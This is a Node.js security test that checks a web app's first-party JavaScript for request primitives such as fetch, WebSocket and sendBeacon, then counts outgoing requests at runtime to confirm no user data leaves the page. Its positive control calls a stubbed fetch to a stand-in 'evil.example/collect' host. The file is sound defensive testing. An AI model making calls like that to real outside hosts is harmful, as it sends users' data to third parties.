"use strict";
/* no-exfiltration.test.js - the app must not send user data anywhere.
 *
 * Run: node tests/security/no-exfiltration.test.js   (from the repo root)
 *
 * Two layers:
 *  A. Static: walk every first-party .js under web/ (unique by content;
 *     site-integration/bundle is a byte-identical deploy copy, so it is
 *     deduplicated, not double-counted). The vendor/ directories are excluded.
 *     Assert zero request primitives (fetch(, XMLHttpRequest, WebSocket(,
 *     EventSource(, navigator.sendBeacon) except three documented cases:
 *       - executor/js/net-guard.js: the instrumenter itself, which wraps
 *         the primitives to COUNT cross-origin requests for the trust UI.
 *       - executor/js/executor.js: one same-origin fetch of the vendored
 *         ONNX model, sha256-verified in-browser before use, with
 *         { credentials: "same-origin" }. Same-origin asset loads are
 *         page loads, not exfiltration.
 *       - import/manifest-tie.js: the dbt manifest adapter release tie
 *         (MANIFEST-ADAPTER-CONTRACT.md section 9, privacy rules V-2 and
 *         V-3). Exactly one fetch call site, GET only, no body, fixed
 *         movahedi.ca releases base, paths naming only a validated
 *         release ID. These are public release records; no file content,
 *         manifest field, projection, or hash is ever sent. The strict
 *         shape is asserted below, like the executor.js case.
 *  B. Runtime: install net-guard's instrumentation over a recording fetch
 *     stub, exercise every pure first-party module (tokenizer, utils,
 *     templates, narration, review, i18n, exporter, import parse-core,
 *     SpreadsheetML parser, chatbot recipe validator), then assert the
 *     instrumented external-request counter reads zero.
 *
 * ORT VENDOR EXCEPTION (why we do not grep the vendored bundle): the
 * vendored onnxruntime bundle (web/executor/vendor/ort/ort.min.js) contains
 * inert comment URLs and minified code that naive greps flag (e.g. the
 * string "fetch(" inside comments/dead branches). Grepping it proves
 * nothing. The check that matters is runtime behavior: the instrumented
 * request counter below, which stays at zero when the real modules run.
 * Vendor integrity itself is covered by dependency-hygiene.test.js
 * (sha256 pins in VENDOR-MANIFEST.md and web/site-integration/SHA256SUMS).
 *
 * No em dashes.
 */
global.self = global;

const assert = require("assert");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");

const WEB = path.resolve(__dirname, "..", "..", "web");

let n = 0;
function ok(cond, msg) { n++; assert.ok(cond, msg); }
function eq(a, b, msg) { n++; assert.strictEqual(a, b, msg); }

function sha256(buf) { return crypto.createHash("sha256").update(buf).digest("hex"); }

/* Collect first-party JS, deduplicated by content hash. */
function firstPartyJs() {
  const seen = new Map();
  const out = [];
  (function walk(dir) {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      const p = path.join(dir, e.name);
      if (e.isDirectory()) {
        if (e.name === "vendor") continue;
        walk(p);
        continue;
      }
      if (!e.isFile() || !e.name.endsWith(".js") || e.name.endsWith(".test.js")) continue;
      const buf = fs.readFileSync(p);
      const h = sha256(buf);
      if (seen.has(h)) continue;
      seen.set(h, true);
      out.push({ rel: path.relative(WEB, p).replace(/\\/g, "/"), src: buf.toString("utf8") });
    }
  })(WEB);
  return out;
}

const SINK_RES = [
  { name: "fetch(", re: /\bfetch\s*\(/g },
  { name: "XMLHttpRequest", re: /\bXMLHttpRequest\b/g },
  { name: "WebSocket", re: /\bWebSocket\s*\(/g },
  { name: "EventSource", re: /\bEventSource\s*\(/g },
  { name: "sendBeacon", re: /\bsendBeacon\b/g },
];

function main() {
  /* ---------------- A. static scan ---------------- */
  const files = firstPartyJs();
  ok(files.length >= 20, "scanned a plausible number of first-party files (got " + files.length + ")");

  const findings = [];
  for (const f of files) {
    for (const s of SINK_RES) {
      const hits = f.src.match(s.re) || [];
      if (!hits.length) continue;
      if (/(^|\/)net-guard\.js$/.test(f.rel)) continue; /* the instrumenter itself */
      if (/(^|\/)executor\.js$/.test(f.rel)) {
        /* Documented same-origin model load only. */
        eq(hits.length, 1, f.rel + ": exactly one fetch call expected, got " + hits.length);
        ok(/fetch\(_modelUrl,\s*\{\s*credentials:\s*"same-origin"\s*\}\)/.test(f.src),
          f.rel + ": the single fetch must carry { credentials: \"same-origin\" }");
        ok(/_modelUrl\s*=\s*vendorUrl\(/.test(f.src),
          f.rel + ": the fetched URL must come from vendorUrl()");
        ok(/function vendorUrl\(path\)[\s\S]{0,200}new URL\(path, SCRIPT_BASE\)/.test(f.src),
          f.rel + ": vendorUrl() must resolve relative to the script's own URL (same origin)");
        ok(/SCRIPT_BASE[\s\S]{0,400}document\.currentScript/.test(f.src),
          f.rel + ": SCRIPT_BASE must derive from the script's own URL");
        continue;
      }
      if (/(^|\/)manifest-tie\.js$/.test(f.rel)) {
        /* Documented release-tie exception (contract V-3): only the
           fetch( sink is allowed, in exactly the asserted shape. Every
           other sink in this file is still a finding. */
        if (s.name === "fetch(") {
          eq(hits.length, 1, f.rel + ": exactly one fetch call site expected, got " + hits.length);
          ok(/RELEASES_BASE\s*=\s*"https:\/\/movahedi\.ca\/dbt\/releases\/"/.test(f.src),
            f.rel + ": the fetch base must be the fixed movahedi.ca releases base");
          ok(/fetch\(url,\s*\{\s*method:\s*"GET"\s*\}\)/.test(f.src),
            f.rel + ": the single fetch must be a bare GET with no options beyond the method");
          ok(!/\bbody\s*:/.test(f.src), f.rel + ": the tie must never send a request body");
          ok(/"index\.json"/.test(f.src) && /"current\.json"/.test(f.src) && /"\/release\.json"/.test(f.src),
            f.rel + ": only the three public release records may be named");
          ok(/RELEASE_ID_RE\s*=\s*\/\^rel-/.test(f.src),
            f.rel + ": the release ID must be validated before it enters a URL path");
          continue;
        }
      }
      findings.push(f.rel + ": " + s.name + " x" + hits.length);
    }
  }
  eq(findings.length, 0, "unexpected request primitives in first-party JS: " + findings.join("; "));

  /* net-guard.js must instrument, never originate, requests. */
  const ng = files.find((f) => /(^|\/)net-guard\.js$/.test(f.rel));
  ok(!!ng, "net-guard.js found in scan");
  ok(/__s1net/.test(ng.src), "net-guard exposes __s1net");
  ok(!/fetch\(\s*["'`]https?:/.test(ng.src), "net-guard never fetches a hardcoded remote URL");

  /* importScripts / Worker URLs must stay same-origin (relative paths). */
  for (const f of files) {
    const m = f.src.match(/importScripts\(([^)]*)\)/g) || [];
    for (const call of m) {
      ok(!/https?:\/\//.test(call), f.rel + ": importScripts must not load a remote URL: " + call);
    }
  }
  const wc = files.find((f) => f.rel === "import/worker/worker-client.js");
  ok(!!wc, "worker-client.js found");
  ok(!/new Worker\(\s*["'`]https?:/.test(wc.src), "worker-client never spawns a worker from a remote URL");

  /* ---------------- B. runtime: instrumented counter ---------------- */
  global.location = { href: "http://localhost/" };
  const fetched = [];
  global.fetch = function (url) {
    fetched.push(String(url));
    return Promise.resolve({ ok: true, arrayBuffer: () => Promise.resolve(new ArrayBuffer(0)) });
  };
  require(path.join(WEB, "executor/js/net-guard.js"));
  ok(global.__s1net && typeof global.__s1net.count === "function", "net-guard exposes __s1net in Node");
  eq(global.__s1net.count(), 0, "counter starts at zero");

  /* Load the pure modules (dependency order) and exercise them. */
  const Tok = require(path.join(WEB, "executor/js/s1tokenize.js")); global.S1Tokenize = Tok;
  const U = require(path.join(WEB, "executor/js/s1util.js")); global.S1Util = U;
  const Narr = require(path.join(WEB, "executor/js/narrate.js"));
  const Tmpl = require(path.join(WEB, "executor/js/templates.js"));
  const Rev = require(path.join(WEB, "executor/js/review.js"));
  const I18n = require(path.join(WEB, "executor/js/i18n.js")); global.S1I18n = I18n;
  const Exp = require(path.join(WEB, "executor/js/exporter.js"));
  const PC = require(path.join(WEB, "import/worker/parse-core.js"));
  const P = require(path.join(WEB, "import/engine/spreadsheetml-parser.js"));
  const Chat = require(path.join(WEB, "chatbot/js/chatbot.js"));

  Tok.parseJsonFields('{"x": 40, "label": "CRM"}');
  Tok.canonicalFields({ b: 2, a: 1 });
  U.canon({ b: 2, a: 1 });
  U.deepCopy({ a: [1, 2] });
  ok(Tmpl.CHIPS.length === 4, "templates CHIPS load");
  ok(Tmpl.authoredTemplates().length > 0, "authored templates load");
  Narr.narrate("add_node", { type: "system" }, null, { label: "CRM" });
  Narr.reviewPrompt("node", { label: "CRM", type: "system" }, "en");
  Rev.deriveChecklist({ _nodes: { n1: { type: "system", x: 100, y: 100, label: "CRM" } }, _edges: [], _annotations: [], _items: [] });
  I18n.strings("en"); I18n.strings("fr");
  Exp.buildDraftWorkbook(
    { nodes: { n1: { type: "system", x: 100, y: 100, label: "CRM" } }, edges: [] },
    [], [], "en");
  PC.parseCSV("a,b\n1,2\n");
  PC.detectFormat("data.csv", Buffer.from("a,b\n1,2\n"));
  P.buildSpreadsheetML({ nodes: { n1: { type: "system", x: 0, y: 0, label: "CRM" } }, edges: [] }, "en");
  const vr = Chat.pure.validateRecipeText(JSON.stringify({
    recipe_id: "r-1", schema_version: "1.0.0",
    items: [{ intent: "add_node", params: { node_id: "n1", type: "system", x: 100, y: 100, label: "CRM" } }],
  }), "en");
  ok(vr.ok === true, "recipe validator runs");
  ok(fetched.length === 0, "no module issued a fetch during exercise (got " + fetched.length + ")");
  eq(global.__s1net.count(), 0, "instrumented external-request counter reads zero after exercising all pure modules");

  /* Positive control: the instrumentation actually counts external requests. */
  global.__s1net.reset();
  global.fetch("https://evil.example/collect");
  eq(global.__s1net.count(), 1, "external fetch is counted");
  global.fetch("http://localhost/s1/executor/vendor/model/model.onnx");
  eq(global.__s1net.count(), 1, "same-origin model load is not counted as exfiltration");
  const log = global.__s1net.log();
  eq(log.length, 1, "log holds the one external request");
  eq(log[0].url, "https://evil.example/collect", "log records the external URL");
  global.__s1net.reset();
  eq(global.__s1net.count(), 0, "reset works");

  console.log("PASS " + n + " [no-exfiltration]");
}

try {
  main();
} catch (e) {
  console.error("FAIL no-exfiltration: " + (e && e.stack || e));
  process.exitCode = 1;
}
